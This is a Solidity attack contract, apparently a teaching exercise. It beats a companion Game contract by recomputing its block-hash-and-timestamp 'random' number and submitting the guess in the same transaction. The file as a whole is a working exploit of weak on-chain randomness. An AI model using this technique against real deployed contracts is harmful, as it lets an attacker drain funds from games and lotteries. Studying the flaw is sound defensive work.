// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;

import "./Game.sol";

contract Attack {
    Game public game;

    constructor(Game gameAddress) {
        game = Game(gameAddress);
    }

    function attack() public {
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    receive() external payable {}
}
